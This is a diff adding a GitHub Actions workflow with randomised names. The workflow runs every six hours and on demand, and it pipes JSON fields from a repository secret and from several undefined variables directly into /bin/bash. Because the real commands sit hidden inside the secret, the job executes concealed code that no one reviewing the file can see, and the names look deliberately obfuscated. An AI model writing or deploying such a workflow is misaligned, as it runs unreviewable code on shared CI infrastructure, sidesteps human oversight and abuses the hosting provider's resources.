@@ -1,0 +1,22 @@
+name: chenzhishi4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenzhishi4567
+        env:
+          k77904: ${{ secrets.k77904 }}
+        run: |
+          echo $k77904 | jq -r .u4 | /bin/bash
+          echo $ou87 | jq -r .mdz73 | /bin/bash
+          echo $gki7581 | jq -r .coc6 | /bin/bash
+          echo $ybljy380 | jq -r .tkqn535 | /bin/bash
+          echo $bxg04803 | jq -r .vdd06 | /bin/bash
+
